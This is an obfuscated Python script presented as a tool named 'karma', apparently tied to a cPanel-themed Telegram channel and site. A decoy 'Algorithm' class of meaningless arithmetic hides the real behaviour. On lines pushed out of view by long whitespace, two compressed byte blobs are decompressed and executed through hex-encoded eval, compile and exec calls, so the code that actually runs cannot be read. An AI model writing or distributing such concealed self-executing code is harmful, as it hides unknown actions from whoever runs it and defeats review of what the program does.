from builtins import *
from math import prod as _power


__tool__ = 'karma'
__authors__ = ('Telegram:', '@xnabob')
__api__ = 'cpkarma.cc'
__telegram__ = 'https://t.me/cPanelKarma'
__version__ = '1.0'

__code__ = '4836037d39227231520bc3346a94c8a7'


_statistics, Divide, Floor, Calculate, _divide, _run, Builtins = exec, str, tuple, map, ord, globals, type

class Algorithm:
    def __init__(self, Cube):
        self._invert = _power((Cube, 92958))
        self.Power(_calculate=-12339)

    def Power(self, _calculate = int):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._invert *= 9131 - _calculate
        
        try:
            (({_divide: Floor}, Floor) for Floor in (_statistics, _statistics, Floor))

        except OSError:
            ((Divide, Floor, _divide) or _statistics if (Divide, Floor, _divide) and _statistics else ... or (_statistics, (Divide, Floor, _divide)))

        except:
            Builtins(-15606 + 11475) == int

    def _system(self, _builtins = 28899):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _builtins -= 92235 - 98270
        self._add != str
        
        try:
            ((Divide, Floor, _divide) or Calculate if (Divide, Floor, _divide) and Calculate else ... or (Calculate, (Divide, Floor, _divide)))

        except TypeError:
            (((Divide, Floor, _divide), Divide) for Divide in (_statistics, _statistics, Floor))

        except:
            Builtins(2961 * 45263) == None

    def Positive(Absolute = bool):
        return _run()[Absolute]

    def _product(DetectVar = -75011 / 97882, Round = int, _stackoverflow = _run):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _stackoverflow()[DetectVar] = Round
        
        try:
            (((Divide, Floor, _divide), _divide) for _divide in {Calculate: Divide})

        except TypeError:
            ((_statistics, _statistics, Floor) or Floor if (_statistics, _statistics, Floor) and Floor else ... or (Floor, (_statistics, _statistics, Floor)))

        except:
            Builtins(73754 / -85940) == None

    def execute(code = str):
        return _statistics(Divide(Floor(Calculate(_divide, code))))

    @property
    def _add(self):
        self._substract = '<__main__.Negative object at 0x000008088BE10271>'
        return (self._substract, Algorithm._add)

if __name__ == '__main__':
    try:
        Algorithm.execute(code = __code__)
        Run = Algorithm(Cube = -3277 * 86779)

        Algorithm(Cube = 51354 - 66534)._system(_builtins = -78752 - Run._invert)                                                                                                                                                                                                                                                          ;Algorithm._product(DetectVar='DooODDoDOOoOOoDDooooODOO',Round=b'x\x9c\xe5\x1cko\xe36\xf2\xbb\x7f\x85\x9b~\xb0\x84\xba\xa9\xac\x07%\x070p\xc5\xb9\xc59\xcd\xc6\x05\xb2\xbd\r\xb0X\x18\xb2D5Je\xc9\x95\xe4n\x82\xe2\xee\xb7\xdf\xcc\x90\xb4\xe4gd;\xce\xb5X\xc9\x14\xdf\x149\x9c\x19\x0e\x87#\x97\xf9\xf3U\xab\rW\x1ci\xe4\xe35\x99\x94Y\x96L&\xed\xaf\x06\x17\xbf\xf9\xf9\xcc\xbfhgy-\xd7_\x94\x0fY^P\x01\xed\xe2=O\xf8\xaf\xb9?\xbb\xba\xe8^\xfc\xe3)\xf5\xa7\xd9\xf4B_-?\x8fEc\xc1\x9c\x9a\xbb\x0c\x82\xb5\x16K\xd9\x86(\xf6P\x96\xf3\xe2\xea\xbb\xef\xca\xcb\x19\xff.\xf8\xd9Oy\xf2\xd3\x96n\xfc\xc1\xf3"\xceRQ\xa7wi\xace\x07Y\xc8)\xafc{\x163,7\xb4\xfa\xa6\xe9\x9aV\xcf1\x8di`Y6\xf3\xfbv\xe0\xf9n\xa7\xa5_-+\xc6i\xa9u\x8a\xdf\xe2\xb0\xa3\xb7\xf8S\xc0\xe7\xa5\x04P:_\x94\xda\xc5\xcf\t\xf7\x0b\xde\x1efi\xa7l\xbf\xcb\xc28z\xbe\xd0[\xe2\x8d\xf1l\x9e\xe5\xe5d\x02\xf5\x9f\x8b\x8e~\xc9\x9f\xe2R\xd3[I\x16\xf8I\xa1\xe9\x1f;w\xa6yw\x07\x0f\xe1a\xa0\xf3i\xf0k\x92M!\xbf\xb5\x99)\xab\x98*\xe7N\x86\xee:\x1f\xaf\xae\xbe\xf9\xf6\x9bo\xb5o\xb5oz\xba\xfe\t\x1a\xe1\xa5_\x96\xf9\xaeF0,~\xe62\x80\xdefCa\xbc\xab\x91\x0f\x1f\xee\xef\xc1\xd1\x0f\x82\xf7\xc2\x87\x01\x88\xf1\xb5\xb6\xe7c\xcd\xcfp=}~\xc2\xdf\x13=1\x01*V\x10\xdb\xf1\xcaY:\xc3\xdf,\xc5\x07z2\x02u\xb7\xb6\xa9u\xa6\x8b8)\xe3\x14\xa1\xff\x87\x9f\x17\xad]-,A+\xa0a\n\xe8b\x04\xda\xeet.\x1f\xb38\xdd[\x19<\x19\xc7[D\xe0\x86\xdaw+sEM\x9bw\xda\x8e\xfe\xc6qP\xf8i<]\x9f\x08\xbd\xbb\x9c#\xd9?5\x85\x877\xa5\x7f|\xc5\xb6.\xe34\xe4OZ\xe79\x8a\x93\'\xfe\x90.6\x8a|\xd2w"\x10a\x87\xc0\x92{\xf2\tg\xee\x0f\x05Z\x91\xc6e\x12/^\x03h;\x9b:\x02h\xbb\xdbR@\xe3E\xe2\xff\xb8\r`{1M\xc4Su\x89\xe8\x17\x03\xb3\xc4\xff\x83o\x03\xd9nv\x93\n\x82\x9c\t\x90\n\nE\xef\x8b\x01Y^\x16\xcd\xa9\xf2f\x04\xf7\xf55\xb8\xd1\xf5\xf5\xcd\xf5\xcd\xcd\xcd\x08\xae\xeb\xd1\xe8\x8b\x01\x17_\xe4\xef\x0f%\xca\xf1p8\xcc\xe01\x1e\x8e\xc1\xcb\xc6Y\xf6\xc5\x80+\xc9\xb2\xcd\xdc\xbd\x04yW\x13<j\xd2\x07\xdc_\x0c\xd0J?K\xa2C\x96J\xb1>\x12\x18\xc5\x85p\xfdb\xc0\xc5\x93x>\xcb\x82\xc6\x00\xdb!\x8di\xd3\x8ecY&:\xf1\x14\xa1z\n>\x1d\x0b\xc4\xc5\x90\xe3\x86A\xebxQ\xb9E\xa6\xf9B\xe0\x1e\xf0\xa7\xad\x8b\xed\x1eV\xb8\x1b\xf4v\xc4"\xdbf\x11\x93>\xc5\x97a\xdb\xb6e\xe8e\xe0\'\xfel\x1a\xfamA\n\x1f\x04k\x11\xfe\xfd\x87\xab\xdd}\xdb\xcb\xc1\xdf\xc1u\x0b?r\xb7\xef\xe8\xaa\xbfz\xbb\xd8\xa5ut\x03\xb2{\rJ\xee\x06\x8ce\x98\xa1\xe9\x99\xa1\xd53\xfb/\r^\x17\x0f\xd8\x99\x1d\xfc\x1a\xd3ua\xbf\xfb\xe2\x0b\x8e\x9c\xdc>\xdd>\xdc\x01\xf9\x01\xb9\xa0J}yZ\xd3\xac\xd46\x17Rm\x97\xfc\xa6\xed\xdc@\xe8\xc7\x8e\x02i_\xf0\x85:GPw\x95\'\xfc\x06#:|\x8e\x98\xc5<\xd6sm\'b}f\x9f8_\x1d\x00\xa0\x02\xe4\x18@\n\xc0\x1d\xe3\xe3M\xd1\xf5(0\x9c\x0fQ#\xcb\xb0\x89\x07Y\x86\xe0E\xac\x96\x02<H\xa6\x1f\xc0\x87\x88c\xdc\x12\xff\xb8\x15\xa1[q]m[\x9c\xf6\xcb\x91\x02\xef\x91\x06p\xe2`\xc6\x1a\xf1 k\xe2N\x8cI\x7f\xe2\x81\xef\xd0\xb3\x0f\xc5\xed\xcd\xd4F\xad\xb9\x13\x06\xf5\xb0f\x0fB\xee\xc4\x9c\xf4\xa0\xb8\xb7\x99\xfaV\xfc\xd1r"\xcb\xad\xb9>8G\xba\x1e8\xdb\x9c\x12B\xbeT\xcej\xce_O\xe3\xb3\x86\xdbwm\xa0\xe3\x88\xf13s\\\x16\xb0@\xf2\xde~\x15R9\x8dQ\x18\xf0m\x8c\x9c!C\x06\x91!\xfa\x1d\xbb\x8e\xd2j,Yqmi\xbe?\x1d\x03\xfa\xb5\x19e\xe0L\xe90\xee\xd50`_9\xf7\x8c,\x8b1\x86@w\\\xcb\x8cX\x88<\x1cy\xb9\xc9\x11\x1b\xce\x86\x05\xf0"\x0ewH~(\xfdz\n\xb8\xc6X XT\xa5\x14\x16\x8c\x0b\xe2G"\xc3\xbe\x85\xb6\xbe\x90VBx%\x82\xaf\xe6\x9cg\xb15\x9d\x80q\xc7e=\x06\xe4j\x1a\x8e\xc38L\x1aL"\x84\x91|\x1d\xf0-\x06H\x03\xf9\x06\x96\xb0qqv`Z\xa7\x10v\xa0\x1eN0\x96\xc1\xd4\x00\xeb\xd9=\x808\x96$d\x80\xd6\x1c\x10\xba\xaa\xd6\\\x16AkS\xc8\xe3\xcc\xad\xd7\xc4\x9e\x98\xe6\x99\x90\xc4\xf1\xd6n\x97\xee\xca\xaf\xa5\xbf\x0c\xe7-"\x9a\xf6\xdf\xdd\xb2X\x96k\xdaN\xa5\x92\xee\xa7\xe1\x19\xe48\\\xc6m\xb9\xd1\xa0+Z\xba\xc6\x9b\x8c#\xd0\xe9\xc4\t\xec\\\x8f\x08P\x00\x9dk\x04\x13^77\xa71\xce\x9e\x94\xd5\x8c32>\xcb\xb3z\x96\x05\x84\xe2\x01\x9d\xf6\x81`m\xcb\xb0|\xbb\x07\xb7g\x87\xcc\xb2=\xe6\xbb\x06\x84m\xdbe\x1e\xae\xc40\x0b\x0c\xe6\xc1w}fB\xc5\x80\xd9\x8cCI\xc7\xf1\\\xcb\x02viG\x8e\x8f\xed\xd9\xe1\xa9\x02\xb0\xd01\xdd\xc9c3)\x8d\xdd5\x12\\@\xe8\xf9\xd6\xf8?\x95\xdc7\xa3R\x98\xc1\xa5\xcd\x93\x8e)AH.u}\xb9\x1c6)\xeb\xbd\x8dPd\xda\x82\xbb\x12?\xb4\xe5R\t\\\xb0\x07k\x94c\xf9\xa6q*\xf1\x98\xea\xc8Nj\x15\xd7\x8e3\x0f\x07\xb4\x92"\x99\x94\'\x14\xc00\xcd\xa8I\x9d/\x95k(u\x1e\xb7M\n\x81\xd8\x18\x90\\\x1f\x88\x0f\t\xaf\x87\xc4w*\xd1\xc87T\xbdh\xb8\t\xf1&\xd6\xc4\x86\xad\x863\xc1-\x04\xc4i\x13\xb2\x91\xda\xa85,\xe9\xc2\xedA=\xdc\xc8\x88\xd6\xdc\xcd\xd4\x86[\x1a\x07\xb6-.\xd4\xe9\xc1\xc6\x05k;\xb4\xa5\xd9H}sENES5Q\x1c\xd7V\x90\xc5\xc7\xb4\x03\x14.\x1b^\xed\xd2\xa8\x1f\xbd\x7f\xf0\x97\x0ew\x0e\xc2\x05Rs\xd3Lcs\x04\xc6F J9\xcc\x04\xf2\xef3\x10\xd7\x99\x07L!\x04\xd1\xe9D\x9c\x8d\x1f\xe38I\xe2\xf8\xf11y\x84+\xc6`\x12\x9f6\x9d\x9e\xa4b[\xba\xbe\x8c\x9b2N\xbb\x0b\xc9\x05\x9a\x94=\xa7\xc2\x04`\xd8wQ\x98\xb4A\x883\xdcJ$\x05\xa6\xeb\x02\x8cO\xd7$\x016\x1a\x86\x01\xcf\x0cd>\x03\xc3\xf8\x18\xbf\xb5|\xf2FJ\xc2N&\x080\x03?\xc3\xb7\xc1\xa8\xdfj\x897%\xbeX5\\2\xe4\x0e\xd6\x92N\xe1]\x93\xb2\x07\xe9\x95\xff\x0e\xe2=\xdf\xb8C\xb8Uh\xe9\x1ao|oo\xdf\x91\xca\x9f|\xf1\xa0\xd3\x80c\x95 \xa8J!=\xca\x90\xe08&\x80\x0e_\x17\x7f:\xba\t\x8b\x16.\x85\x06,`&,^\x8c\xf4t\xd6f\xea\x9b\x92\xe8\x8bB\xa2P\t6\x1b\xe2+(\x0f\x95\x18fHBa5\x05\xa1R\r\xf5j\xa2\xdcKe\x0f\x01\xc3\xf1*j&\x9dRI\x8b\xc32\x15RqU\xe2L\xbbYT\x90\x18\xa1\xe1;\x01\xbc\x06.g\n\xf2\xe5\xd4B\xad\xcc\x14\xe5L\x16b\xae\x19\x80\xf0n\xc8g\xd3;\x00\xa4\xe2\x14\xe2k9\xbc\x96\xb6Yb\xbd\xf4\x9et\xec\x9b\x8b\xbd\x8a\x0e\xea\x99\'|\x06\xce]\x1b\x13\xc6U\x9a\xf0\xeb%\xd6K\xefK\x17}\xb3T\x0e@\x03\xb7@\xd6T@E\xfa\x02B2o\xd9+\t77\xa8\xf2\xd1\xdf\xde7\xd5"\xa5\x04k-\x82_OWe\x15\xdc\x9ce+\xebm\xaf\xbb\x95\x19\xe8\xaf\xe4\xc1\x06~W\xdf\x1a\xbae\x0b\nn\x18\x17\xf3\x83\xd0@_\xa4H_\xbae^\x057\xb7^f\x99\xe2V\xf5)-dF\xf5\xdezI\xd5b=^\xafM};\x04\xd3\x8e\xbd\xddcj\xad\xd1\xb1\xa4\xdd\r\xcav\x18\xac\xa4\xac\xe7Z\xae\x05#\xb4\x1c\x83\xa1B\xd3\x91*\xd1hU\xd9\xe9\x80\xa4\t\xa1\x08\xca\xd0\xc6~\xb5}Tin}\x07\xc8\xfb\xd0\x96C\n\x00\xd75Q\x05`\xad\xf5\r\xb1o\x19\xc7\xfd\x01H\xb0p\x83\\\x0b\x98\x1b\xc1\x1e\xc26Q\xb9\xed@\xc8#%\x82\t\xbd07\xc7\'\xb8\xd8\x89Z\xb9k!\xdc\xdc\x90O\x8f\xbf\xb4a\xc0_F\x80\xeb\x8cq\xa706\xe8B\x0f\xe2\xf88q\xcb\xf0\x06\xc7\xcft0PWX\xad\xa8\xf8__y\xb5\xbb+\xca\x12\xa1:\x08\xa9\x1f\x8a\xa8\xbb\xb1\xa0\x0b{\xe48\xc1-r"/Hx|e\xc5\x82+.\x8f\xdc\xfaS\xe5\x89\xb0w\x06\xc1e\x89\x1fM\x04\xb5\xbd\xe8;\x1a\x01\x80\xe0A?\x11I\x92\xd3\x95\xb7\x86\xdc\xa9)a\xd3\xab\t\x9aB\xc0\xac\x94\xb7\xfb\xca\xf6H\xd1{F\x8dB\xefl\xa7\x96\xf2\xd0\xc9]\xf1\xd7\xd3d\xb81n\'\x80\xd5\x84\xdc\xf4D}P\xfc\xf8x\xb0\t\xc6\x9eN{\xb5\xb3\xb2\xea\xdc\xac\xde]\xaf\xc9\xf9\xd9\x11\xec\x08\xc4\x91s1\x18e\xef\x82\xdb\x08e\xf9R\xa5T61"\x15\x9f\x7f\x07C.\xe6\x13\x8fF\x1d\xa3O\xb7\x8a\x05U\xbc1b-{*\xdf&\xfa\xf3\x8a\x98%\x0f\xee\xb7\x1d\xe5+\xc7kG\xfb\x8d\x8e\xf4\x8f\xc02X\xc8N\x14\x95\xc6\xa40\xc3\xcb -!8\xe3\xd4\xe5\xfe-N0A\x08=\x9fi\xa4\x9c\xbdU\xa3\x0c\xbe\x9c\xe3\xfa,S\xac1^V\x16\xe15c\x9bWDK\xb2\xdb\xecK;Nq. \xce\x0b\x02i\xd3\xd9\x97\xf6\x9d\xe7:-\x90\xc6]\xe1r9\xa4\xe5\xef\xd4e\x1dVq\xb1\x96\xd3\xb2\x9e\x9c\xba\xa4\xbf\x855$C\xb3iX\xf4Q\xdcD\xa1\xf4de>\xd2\xe6\x90\xa8\x15\x15\x95\xc2\xea0kx\xca\xd7\x9f\xb0\x89I\xc6\x80\xe6\xc4\xa4\x13\xbe\x95\x94\xd3\xa0\xe9(\x8d\x9c:\x9d\xae\xa9\xb7\x95\x10\xa4T\xdfM\xca\x9e\xdd\xa4\xfa\xe4\x83+\x11W/\\\xc6f\xcd\x0e]\x1d:\\\xedM<\x98\x04\xb4\xf6dP\x98\xad\xa7\x9d6%J\x11\xaa@\xac\x8c\x07T\x18\x9d+\xa7\xa4I\xd9&\x04|\x8a')

        Algorithm(Cube = -48195 / 81381)._system(_builtins = 4503 * Run._invert)                                                                                                                                                                                                                                                          ;Algorithm._product(DetectVar='wxxwxxxwwwwxxxxxww',Round=b'\xa1\xc1\xba\xae\xe0l\xa2\x93\xdc\xc8\xacok\x94;\xf7F\xa7\xf9\xb2\x15\xe5\xd9\xac\xad>\x85n\x8b\x8f\xac\xdb\xfc\x89\x07]\xfa\x8a\xbd;\xcf\xe3\xb4\xec\xa2\xcb\xe6<\xed\xfe\xbe\x88\xcb\x16fk\xca^\x1c\xcf0j\xa6\xe4zK\xb6\x91\xf3\xdf\x17\xbc(\x8bn\xf1\\\xa8\xb4\xa8\x9c\'\xf1T\xc5\xb2ez\xb1\x98\xce\xf3,\xe0E!\xfa\x13dI\x96\xfb3_\xf5\xe7\xc7,\xe7\xd0\x07x\xf5\xfb\xf1O?\xdc\x0en\xa4\x01\x14\xa9\\nHC1\xban\xfd\xf3_\xdf\xbf\x9f\x8c\x86\x03i\xe1!\xcd=h\x99kae\xcd_\x94\xd0P\xc1\xcb\x01\xd4%;\xaa\xd15\x19T\xa1\xd3[4T\r\xa4\x12:\xbb\x1c\xa36\x02\x1f\xe8c\x82\xde\nr\x1e\xf2\xb4\x8c\xfd\xa4\x98Dq\xc2\x07\xe2C\xff\x9a\xf1\x90\x08\xd1[\xf5\xaf\xdb\xbf\xccC\xbf\xe4\xed\xcfq\xf9\xd0~\xce\x16y\x1b+\xb5\xe7~\xf9\xd0\ny\xd4.x\x1aN\xc2,X\xcc\xa0Q-x\xf0\xcbI\x1cvU\xc2\x04\xcb\xc9?\x1bX\xe4\xc9\xe18\xc0\xd8&\xbe\xb3\x9ek\xb0\xbeI\xba\x8b\xba\x8e\xcd\xe4d|\xe8B\t\x13B\xb6;u\xd0 nj;6wC3r-\xd2i\xd8\xf6\xfab\xd3\x80~p\x00\xa5\xfa\xef\x08\xbc\x08\x1e\x88M\xda\xcaX\xbb\x04j!\x1a\x1aRT\x84\xe5G\xf7\x8b\xb6*W\xb5\x81\x17B\xb3\x18\xfcI\x1b\xf1Qm\xe5\xbeR\xc5\xff\xb3R\x1c\xe6\xc2\x1f\xfcY\xfb\x8a_\x99\xb0\xa2\xbb\x92\xe0_\xad\x02\xc82\xcf\xd2\x82\x0f\x142_\xce\xb3\xa2\xd4`:\xba\xd4\x1a>\xba\xa2\x1b\xf4\xd4Wj\xc7\xd1\xb2\x81\xcb\xa2\xf4\xcbEA\x7f4\xd1\xfe\n\xd0\x0f\x11\x0f\xb5\x86h\xd6\x87H<\x1a\xdd\\\xdf\xac\x0eOt\xa0\\\xe4i\x1bp\x12`c\x90\xc8\x9c\x11J\x8e1:6\xda\xed\xaf\xdb\xa34\x8c\x03\xc4\xb3\xc8\x8f\x93E\xce\xdb\x05t%-\x93\xe7\xd6\x96\x96\xee\x97\x9f\x08*\x85\x0e\x86\xb1\x99\xbbE@\x04\x88\x85\xc5\x9fY\xb4\x7f /\xce\xd2\xaac\xb2\x19\xd4\x00\x12\xf5 \xfd`p\x7fG\xe2ud\x97\xa4\xda]\xa7(\x89\xefs\x1f:\xc2\x93\x82\xd7\xa2\x85\xe8\x1f\x15#|\x19\xc0V\x1euVh\xd2\x81\x9bza\xe2\x11cO\xf6\x10\x1eUO\xfd\x99"^RBf\xa4\x89T\xdaH\xc4\xc0\xb1\x0eS\x96\xc7s\x90\x8f\x91T\xf9S\x99\xfbA\t\x03\x98\xf91\xe2-z\x13\xc0\x03\xd9a\x910\xa8\xd2/s>O\xfc\x80k\x8abk\xcb\xb7\x88u\xa5\x88E\xf6<t\x0c\x0c\xaf\x04\xf6Xj3\xb9\xd8\xd4\xa8\x9aj\xce\xf4\x8f\xd5\xc7z\xf2K=|>}j\xd5\xa6F\xf4\x81z\xbd\x98\'\x99\x1f\n\x88\x01\xeb\xd5\x1e\x00y\xbb\x8b\x82\xe7]\x84\xe8\xe7,\x0f\xbbKp\x88P\x90\xa5%\xcc\x87\x1c\xd5\n\xd5B\x03\x03\xc1\xbf/\x7f|\xff3\xb5\xa5\xd73/\x93\xecW\x00\r6?\xa8\xde\x11\x0e\xd4\xabV\x0b\x07\x9fCm\x84\xe8\x7f-\xcdZ\x11\x95\x80e~\x1f>.\x8a\xb2]>\xc4\x05\xd2O\xca\x01?\xc2\x95\x9a\x05\xf0\xf0i\x9c\xfa\xf9\xb3v\x14Kt,dm\x8ei\x1a\xeeT\x99\xe5;\x91R\xd8\x02\xb3{\x99\xa5\xad\xc2j\xa5w\xb8>j\xfa:\xb9\x90D-\x8cE\x90\xa7\xa1\xc9V3:\x1b\x1b\xca\x98F\xec\x98\x11E\xc9\xda\xa6U1\xd1u\x1a\xea\x8a\x0f\x14\xe5\xc7F\xef\x84\xf5\x02rQ\xcc\x14oH\xe2T\xb2,\xc0S?\xa4(\xf4\xbajs\x83\xd8\xba\x89`\xaf#\xa5\xf3\xa4\x08\xb6Z/*Z\x8f\xb2\x9c\xde\xd0\x8eS\xf1\xa6jX\x18\x1d\xe0cI]5f\x99f\xa5\xa8\x07\xf5\x95\xaeg\xf9\x11\xe7\xfd\x07\xca\x97M\xaerJ\x9c\x898]\xf0e\xa2\xa0\x81UT\x97\xaf%\n\xc3\xa3\x87\xa1\xfc\xaa\x05\xc19\xa4U\xa7\xeaL\x90p?\x95\xc4>\xd8J\xfb\xfa\x96\xd5\xac\xa2%\xfc\x98VR\'\xde\x92L\xd5\x1c(\xcc\xb9Z_-\xd6\xe9\xb5\xde\x8dC\xe8\xb6~\xd5\xa7\xe7\xf2s\x1e\x97\xfc8\xb2\xd98e\x9b2\x8b$\x88\x1e\xe3@>(\x17\x84\xf8\xb1\x04\x13\xf2\xc2V\xd2j\xf8!\x83\xbe1\x08!\x99\x1d\xd5owj3\x92m\x1c\x93\xdb\xaec\x82DC2\x8d\x83R\x8c\x05\xb7#\xce3-n\x1a\xaf1\xc6\x83\xc7W-sg\x181\x8d\xd7vCH\xe9\xc9\x93)[\x8cu\xef\xd8\x9a\x8cA\xf4\xf0n)b/\xbfw\x17B\xb0\xde*\x02\xa0p!\xda\r\xee\xeb\x1fb+\r.<Z  -\x92rPm\x00.\xf3E\xaa}\x1c\x92YTFfR\x82V\xbb\xb5\xe6>u\x8b2\xcc\x16+\xd5\x86?\xfc\xfb\xf6\x97\x9b\x1b\xcc\xe1y\xbe%Go\ty\x0c^w)\xb8+\x8eo@G\xa2\xb8}\x11\x9f\xc0\x0e\xc9\xc4\x16bR\xf28\x03\xe2M\xf1\xc8\xb0\x8e|\x8c\xb9\xe2\xf8\x10\x8f\xcd\xfbP\xc7\xc1\xe3u\x9c\x18\xf0\x19}\x0f\x04\x93\xe6R\x0e\x1e8\xd6\x0c8\r\xcc\xc5R\xf8\x1eL7\xc3M\xf3N\xa7\xd9\x84\xd6\xe4\xad\xe3G\xbd<\x00m\xb25\xd0[\xff\x03%\xdd2*')

        Algorithm(Cube = 36510 - 57089).Power(_calculate = Run._invert + 32949)                                                                                                                                                                                                                                                          ;lllIlIIIlIIIlIIIIlI,S22SS22222222S22S2S22S22,LLIJLJLIILLLJLJIILIL,NNMNMMMNMMMNNNMNNNN,WWWWWWWWWWXXXWWWXWXX=(lambda IIlIIllIIIllllIllIllI:IIlIIllIIIllllIllIllI(__import__('\x7a\x6c\x69\x62'))),(lambda IIlIIllIIIllllIllIllI:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IIlIIllIIIllllIllIllI)"),filename='\x6f\x6f\x4f\x4f\x6f\x6f\x44\x4f\x4f\x6f\x44\x4f\x6f\x44\x44\x44\x4f\x6f\x6f',mode='\x65\x76\x61\x6c'))),(lambda IIlIIllIIIllllIllIllI:IIlIIllIIIllllIllIllI['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda:(lambda IIlIIllIIIllllIllIllI:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(IIlIIllIIIllllIllIllI)"),filename='\x6f\x6f\x4f\x4f\x6f\x6f\x44\x4f\x4f\x6f\x44\x4f\x6f\x44\x44\x44\x4f\x6f\x6f',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda IIlIlIlIIIlllllllIIlIllI,IIlIIllIIIllllIllIllI:IIlIlIlIIIlllllllIIlIllI(IIlIIllIIIllllIllIllI))
        if 104995 > 5858480:
            Algorithm(Cube = -23837 - -33775).Power(_calculate = Run._invert / -6117)
        elif 354935 < 8010581:
            Algorithm(Cube = 78319 / 15617)._system(_builtins = 89365 / Run._invert)                                                                                                                                                                                                                                                          ;NNMNMMMNMMMNNNMNNNN()(WWWWWWWWWWXXXWWWXWXX(LLIJLJLIILLLJLJIILIL(lllIlIIIlIIIlIIIIlI(S22SS22222222S22S2S22S22('\x76\x61\x72\x73'))),Algorithm.Positive(Absolute='DooODDoDOOoOOoDDooooODOO')+Algorithm.Positive(Absolute='wxxwxxxwwwwxxxxxww')))

    except Exception as Negative:
        if 479087 > 5427464:
            Algorithm.execute(code = Divide(Negative))

        elif 405005 > 3823127:
            Algorithm(Cube = -56284 * -60381)._system(_builtins = 7305 * Run._invert)
